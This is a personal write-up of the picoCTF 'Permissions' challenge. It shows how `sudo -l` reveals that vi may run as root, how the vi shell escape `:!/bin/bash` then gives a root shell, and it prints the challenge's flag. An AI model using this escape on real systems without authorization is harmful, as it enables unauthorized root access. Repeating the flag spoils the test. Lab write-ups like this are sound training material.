## Challenge Info
	- **Name:** Permissions
	- **Category:** [[General Skills]]
	- **Level:** [[Medium]]
	- **Link:** [picoCTF](https://play.picoctf.org/practice/challenge/363)
	- **Description:**  
	  Can you read files in the root file?
	  ---
- ## Problem Understanding
  It had the vim tag so i knew it has something to do with vim
  ---
- ## Approach and Steps
	- [Step 1]
	  logseq.order-list-type:: number
		- I searched for root access in vim etc. and then got the correct term for it `privilege escalation`
	- [Step 2]
	  logseq.order-list-type:: number
		- Tried `sudo -l`
		  ```
		  picoplayer@challenge:~$ sudo -l
		  [sudo] password for picoplayer: 
		  Matching Defaults entries for picoplayer on challenge:
		      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
		  
		  User picoplayer may run the following commands on challenge:
		      (ALL) /usr/bin/vi
		  ```
	- [Step 3]
	  logseq.order-list-type:: number
		- run `sudo vi`
	- [Step 4]
	  logseq.order-list-type:: number
		- In vim run `:!/bin/bash`
		  which gave `root@challenge:/home/picoplayer#`
	- [Step 5]
	  logseq.order-list-type:: number
		- run `grep -r "picoCTF*"` which gave the flag
		- ```
		  root@challenge:~# grep -r "picoCTF*"
		  .flag.txt:picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
		  ```
	- logseq.order-list-type:: number
	  ---
- ## Solution
	- The flag was: `picoCTF{uS1ng_v1m_3dit0r_f6ad392b}`
	  
	  ---
- ## Reflections (Optional)
	- [Any insights or things you learned during the challenge]
	- [What would you do differently next time or what could improve efficiency]
	  
	  ---
- ## Tools Used
	- [[sudo]]
	- [[grep]]
	- [[vi]]